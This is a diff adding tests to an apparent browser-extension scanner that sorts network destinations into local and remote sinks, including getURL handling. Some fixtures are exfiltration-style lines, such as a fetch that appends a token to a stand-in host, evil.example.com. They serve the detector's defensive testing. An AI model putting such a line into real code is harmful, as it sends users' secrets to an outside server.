@@ -96,6 +96,52 @@ test("a real remote http sink still flags cleartext after the loopback fix", () 
   assert.equal(hostlike.host, "127.example.com");
 });
 
+// fetch(getURL(<relative>)) / img.src = getURL(<relative>) targets a packaged
+// moz-extension:// resource: a LOCAL destination (no host), never an outbound
+// transmission or exfil channel. getURL resolves the argument against the extension
+// base, so a fully-static relative argument (literal or uninterpolated template)
+// stays local; alias-aware, mirroring the remote-code scanner.
+test("a getURL(<relative>) destination is local, not an outbound sink", () => {
+  for (const code of [
+    'fetch(browser.runtime.getURL("data.json"));',
+    "fetch(browser.runtime.getURL(`data.json`));",
+    'const img = new Image(); img.src = browser.runtime.getURL("x.png");',
+    'fetch(chrome.extension.getURL("data.json"));',
+    'fetch(messenger.runtime.getURL("w.json"));',
+    'const rt = browser.runtime; fetch(rt.getURL("data.json"));',
+  ]) {
+    const hit = one(code);
+    assert.equal(hit.destClass, URL_CLASS.LOCAL, code);
+    assert.equal(hit.host, null, code);
+    assert.equal(hit.cleartext, false, code);
+    assert.equal(hit.dataAppended, false, code);
+  }
+});
+
+// getURL does NOT force a sink local: an ABSOLUTE argument escapes the origin
+// (getURL("https://x") -> "https://x"), so fetch(getURL("https://evil")) must stay
+// a REMOTE sink - a remote/exfil URL wrapped in getURL is not masked.
+test("a getURL(<absolute>) destination stays a remote sink", () => {
+  const abs = one(
+    'fetch(browser.runtime.getURL("https://evil.example.com/c"));'
+  );
+  assert.equal(abs.destClass, URL_CLASS.REMOTE);
+  assert.equal(abs.host, "evil.example.com");
+  assert.equal(abs.cleartext, false);
+});
+
+// Over-suppression guard: getURL resolution must not swallow a genuinely remote
+// sink, nor a getURL on some other object (not the API method).
+test("getURL resolution does not over-suppress remote sinks", () => {
+  const remote = one('fetch("https://evil.example.com/?d=" + token);');
+  assert.equal(remote.destClass, URL_CLASS.REMOTE);
+  assert.equal(remote.dataAppended, true);
+  // getURL on an unrelated object is not the API method -> classified normally
+  // (a bare call value -> dynamic, not forced local).
+  const other = one("fetch(myObj.getURL(x));");
+  assert.equal(other.destClass, URL_CLASS.DYNAMIC);
+});
+
 // A dynamically built <form> that is submitted is an overt transmission to its
 // action URL - the form.submit() exfiltration channel (createElement + action +
 // submit), which bypasses fetch/XHR. (infocodex pattern.)
